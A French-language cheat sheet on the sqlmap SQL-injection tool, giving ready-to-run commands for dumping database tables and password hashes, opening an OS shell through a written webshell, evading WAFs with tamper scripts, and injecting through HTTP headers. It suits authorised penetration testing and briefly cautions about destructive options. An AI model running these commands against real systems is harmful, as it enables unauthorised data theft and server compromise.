# sqlmap — fiche de triche terrain

---

## 1. Commandes de base & ciblage

```bash
sqlmap -u "http://cible.com/page.php?id=1"        # Cible une URL avec paramètre GET
sqlmap -u "http://cible.com/page.php?id=1" --data "user=admin&pass=test"   # Injecte via un corps POST
```

```bash
sqlmap -r requete.txt                              # Rejoue une requête HTTP interceptée (fichier brut)
```

```text
# requete.txt : requête brute capturée depuis Burp Suite (Save item / Copy to file)
POST /login.php HTTP/1.1
Host: cible.com
Cookie: PHPSESSID=abc123
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

```bash
sqlmap -u "http://cible.com/page.php?id=1" --batch    # Répond automatiquement "oui par défaut" à chaque question
```

!!! tip "--batch en environnement scripté"
    Indispensable dans un pipeline CI/CD ou un script d'automatisation : sans `--batch`, sqlmap bloque sur chaque question interactive (confirmation de technique, choix de dump).

```bash
sqlmap -u "http://cible.com/page.php?id=1" --level=3 --risk=2
# level (1-5) : étend la couverture des points d'injection testés (headers, cookies...)
# risk (1-3) : autorise des payloads plus intrusifs (requêtes lourdes, potentiellement destructives)
```

!!! warning "Risk élevé = requêtes potentiellement destructives"
    `--risk=3` inclut des payloads pouvant impacter l'intégrité des données (`OR`-based, requêtes lourdes). À réserver à un environnement de test maîtrisé.

---

## 2. Énumération & dump de données

```bash
sqlmap -u "http://cible.com/page.php?id=1" --dbs                  # Liste les bases de données accessibles
sqlmap -u "http://cible.com/page.php?id=1" -D nomdb --tables       # Liste les tables d'une base précise
sqlmap -u "http://cible.com/page.php?id=1" -D nomdb -T users --columns   # Liste les colonnes d'une table
```

```bash
sqlmap -u "http://cible.com/page.php?id=1" -D nomdb -T users --dump
# Exfiltre l'intégralité du contenu de la table users

sqlmap -u "http://cible.com/page.php?id=1" -D nomdb -T users -C username,password --dump
# Limite le dump aux colonnes spécifiées (-C), plus rapide et ciblé
```

| Option | Rôle |
|---|---|
| `--dbs` | Liste les bases de données |
| `-D <nom>` | Cible une base de données précise |
| `--tables` | Liste les tables de la base ciblée |
| `-T <nom>` | Cible une table précise |
| `--columns` | Liste les colonnes de la table ciblée |
| `-C <col1,col2>` | Cible des colonnes précises |
| `--dump` | Exfiltre les données de la sélection courante |
| `--dump-all` | Exfiltre l'intégralité de toutes les bases accessibles |

!!! warning "--dump-all sur cible réelle"
    Un dump complet de toutes les bases génère un volume de requêtes très important et un temps d'exécution long, en plus d'un impact potentiel sur les performances du serveur ciblé.

---

## 3. Attaques avancées & accès système

```bash
sqlmap -u "http://cible.com/page.php?id=1" --os-shell
# Ouvre un pseudo-shell interactif sur le système, via écriture d'un webshell (nécessite privilèges FILE)

sqlmap -u "http://cible.com/page.php?id=1" --os-cmd="whoami"
# Exécute une commande OS unique sans ouvrir de shell interactif
```

```bash
sqlmap -u "http://cible.com/page.php?id=1" --is-dba          # Vérifie si l'utilisateur SQL a les droits DBA
sqlmap -u "http://cible.com/page.php?id=1" --privileges       # Liste les privilèges de l'utilisateur courant
sqlmap -u "http://cible.com/page.php?id=1" --users             # Liste les comptes utilisateurs du SGBD
sqlmap -u "http://cible.com/page.php?id=1" --passwords         # Extrait les hashs de mots de passe SGBD
```

!!! warning "Prérequis pour --os-shell/--os-cmd"
    Nécessite que le compte SGBD dispose des privilèges suffisants (`FILE` sous MySQL, `xp_cmdshell` activable sous MSSQL) et un chemin web accessible en écriture. Sans ces conditions, sqlmap échoue silencieusement ou signale l'impossibilité.

---

## 4. Contournement WAF & évasion

```bash
sqlmap -u "http://cible.com/page.php?id=1" --user-agent="Mozilla/5.0 (Custom)"
# Personnalise le User-Agent, utile face à un filtrage basique par signature d'outil

sqlmap -u "http://cible.com/page.php?id=1" --random-agent
# Sélectionne un User-Agent aléatoire parmi une liste de navigateurs légitimes à chaque requête
```

```bash
sqlmap -u "http://cible.com/page.php?id=1" --tamper=space2comment
# Remplace les espaces par des commentaires SQL inline (/**/), contourne un filtrage naïf des espaces
```

| Tamper script | Effet |
|---|---|
| `space2comment` | Remplace les espaces par `/**/` |
| `between` | Remplace `>`/`<` par des constructions `BETWEEN` équivalentes |
| `charencode` | Encode les caractères en URL-encoding |
| `randomcase` | Alterne aléatoirement la casse des mots-clés SQL |
| `apostrophemask` | Remplace les apostrophes par leur équivalent Unicode |
| `base64encode` | Encode le payload entier en Base64 |

```bash
sqlmap -u "http://cible.com/page.php?id=1" --tamper=space2comment,randomcase,charencode
# Chaîne plusieurs tamper scripts, appliqués dans l'ordre indiqué
```

!!! tip "Identifier le bon tamper via le message d'erreur WAF"
    Un blocage explicite mentionnant "espace interdit" ou "mot-clé bloqué" oriente directement vers `space2comment` ou `randomcase`. Sans indice, tester `--identify-waf` en amont pour cibler les tampers recommandés pour le WAF détecté.

---

## 5. Injection dans les en-têtes HTTP

```bash
sqlmap -u "http://cible.com/" --cookie="PHPSESSID=abc123*"
# L'astérisque marque explicitement la position d'injection dans le Cookie

sqlmap -u "http://cible.com/" --user-agent="Mozilla/5.0*" --level=3
# Injection via User-Agent (nécessite --level=3 minimum pour être testé automatiquement)

sqlmap -u "http://cible.com/" --headers="Referer: http://trusted.com*"
# Injection via l'en-tête Referer
```

| En-tête ciblé | Option | Niveau requis |
|---|---|---|
| Cookie | `--cookie="valeur*"` | `--level=2` minimum |
| User-Agent | `--user-agent="valeur*"` | `--level=3` minimum |
| Referer | `--headers="Referer: valeur*"` | `--level=3` minimum |
| En-tête personnalisé | `--headers="X-Forwarded-For: valeur*"` | `--level=3` minimum ou `*` explicite |

!!! tip "Le niveau conditionne les vecteurs testés par défaut"
    Sans marquage explicite par `*`, sqlmap ne teste automatiquement Cookie/User-Agent/Referer qu'à partir du `--level` correspondant. Le marquage `*` force le test du point précis, quel que soit le niveau configuré.
